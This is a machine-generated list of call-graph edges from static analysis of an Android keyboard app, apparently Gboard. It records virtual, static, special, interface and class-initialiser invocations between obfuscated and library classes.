VIRTUAL edge: $r2 = virtualinvoke $r1.<ljf: java.lang.Object e(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lpi: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r1.<ltc: void <init>(java.lang.String,int,int)>("SMALL", 0, 10) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lkf: java.lang.Object get(java.lang.Object)>($r2) in <ivw: java.lang.String p()> ==> <lqk: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.IllegalStateException: void <init>(java.lang.String)>("cannot request log site information prior to postProcess()") in <lsn: lsq f()> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r8.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_FULL_IMAGE", 8, 8) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
CLINIT edge: staticinvoke <lpi: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lpi: void <clinit>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: int size()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, $i1, $r3) in <lqk: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <lum: java.lang.String[] o()>() in <luk: void <clinit>()> ==> <lum: java.lang.String[] o()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
SPECIAL edge: specialinvoke $r1.<com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Object cast(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: void <init>()>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r4) in <lqs: boolean equals(java.lang.Object)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqp: int size()>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>(0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r5.<lsm: void <init>()>() in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: void <init>()>
SPECIAL edge: specialinvoke $r17.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/inputmethodentry/InputMethodEntryManager") in <hnt: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
CLINIT edge: staticinvoke <gwk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gwk: void <clinit>()>
CLINIT edge: staticinvoke <java.lang.Integer: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Integer: void <clinit>()>
VIRTUAL edge: virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String substring(int)>($i0) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String substring(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lvt: void <init>(lvr)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
CLINIT edge: staticinvoke <lqs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqs: void <clinit>()>
STATIC edge: $r1 = staticinvoke <kwe: miy x(java.lang.Object)>(null) in <her: void <clinit>()> ==> <kwe: miy x(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<mii: void <init>()>() in <mij: void <init>(miy)> ==> <mii: void <init>()>
VIRTUAL edge: $i3 = virtualinvoke $r1.<java.lang.String: int length()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r3.<java.util.Date: void <init>(long)>($l0) in <lsc: void f(java.lang.String,ltn)> ==> <java.util.Date: void <init>(long)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i4) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r1) in <lly: lma g()> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: $z0 = specialinvoke r0.<hbv: boolean o()>() in <hbv: boolean m(java.lang.Object)> ==> <hbv: boolean o()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r7, $i5, $i1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <her: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <her: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" but determined result is ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <ldr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ldr: void <clinit>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
VIRTUAL edge: $r3 = virtualinvoke $r25.<java.lang.Class: java.lang.String getName()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashSet: void <init>(int,float)>($i0, 1.0F) in <ljf: java.util.Set f()> ==> <java.util.LinkedHashSet: void <init>(int,float)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(12) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_GlobalAdditionalImeDefsLoaded", $r5) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i1) in <lkg: void g(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, $i1, $i2) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <hbu: hbs f(java.lang.String,long)>("client_error_logging_level", $l0) in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <hbu: hbs f(java.lang.String,long)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lkx: boolean containsKey(java.lang.Object)>($r1) in <ivw: boolean P()> ==> <lkx: boolean containsKey(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lly g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lma: lly g()>
INTERFACE edge: interfaceinvoke $r1.<java.util.Set: boolean add(java.lang.Object)>($r2) in <ljf: java.util.Set f()> ==> <java.util.HashSet: boolean add(java.lang.Object)>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r0.<hny: void <init>(ivw,java.lang.String)>($r2, $r3) in <hny: hny a(hmm)> ==> <hny: void <init>(ivw,java.lang.String)>
VIRTUAL edge: $l2 = virtualinvoke $r1.<java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>(-4942790177534073029L) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>(0, "No logging platforms found:") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
CLINIT edge: staticinvoke <gsr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gsr: void <clinit>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int d(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
CLINIT edge: staticinvoke <java.lang.String: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.String: void <clinit>()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int f(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: int f(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.util.Map m()> ==> <ljd: void p()>
STATIC edge: $r12 = staticinvoke <hnc: java.lang.String d(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hnc: java.lang.String d(hmm)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>($r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqm: java.lang.Object get(int)> ==> <iye: void O(int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("invalid maximum depth: 0") in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(1) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwk: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r0, null) in <lqq: lqq a(int,java.lang.Object[])> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
SPECIAL edge: specialinvoke $r13.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_METADATA", 13, 13) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: int a()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorImageThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $z0 = virtualinvoke r0.<liz: boolean hasNext()>() in <liz: java.lang.Object next()> ==> <liz: boolean hasNext()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<lkl: void <init>()>() in <lkq: lkl e()> ==> <lkl: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: int size()> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke r0.<lss: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: interfaceinvoke $r0.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(14) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] y()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lmb: void <init>()>() in <hbv: void j()> ==> <lmb: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
CLINIT edge: staticinvoke <java.lang.Double: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Double: void <clinit>()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("forced", class "Ljava/lang/Boolean;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvr: int size()>() in <lvr: int b()> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqm: void <init>(lqn)> ==> <lkq: void <init>()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("group_by", $r1, 1) in <lsj: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
CLINIT edge: staticinvoke <ltr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltr: void <clinit>()>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r8) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagManager") in <hcb: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: int size()> ==> <ljd: java.util.Map o()>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r1, $i3, $i4, $c0, $c1, $i2) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lly: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke $r9.<mag: void <init>(java.lang.String,int,int)>("AUTOCOMPLETE", 9, 9) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r26.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i9, $r15, $r16, null, null) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>(r0) in <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()> ==> <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $z0 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r1, $r2) in <hbv: boolean o()> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbw: void <init>(int)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.lang.Iterable: java.util.Iterator iterator()>() in <izw: java.util.Collection at(java.lang.Iterable)> ==> <liy: java.util.Iterator iterator()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
CLINIT edge: staticinvoke <ljs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljs: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r1, $i2, $r23) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke r0.<lme: void <init>(lkx,int)>($r1, 0) in <ljs: void <init>()> ==> <lme: void <init>(lkx,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean x(char)>
VIRTUAL edge: virtualinvoke r0.<ljd: int b()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int b()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lje: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(5) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfb: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: java.util.Set f()> ==> <ljf: void h()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke $r16.<lsu: void <init>()>() in <lsd: boolean b(lsr)> ==> <lsu: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c3) in <ivw: boolean w(char[],int,int)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lje: void <init>(ljf)> ==> <java.lang.Object: void <init>()>
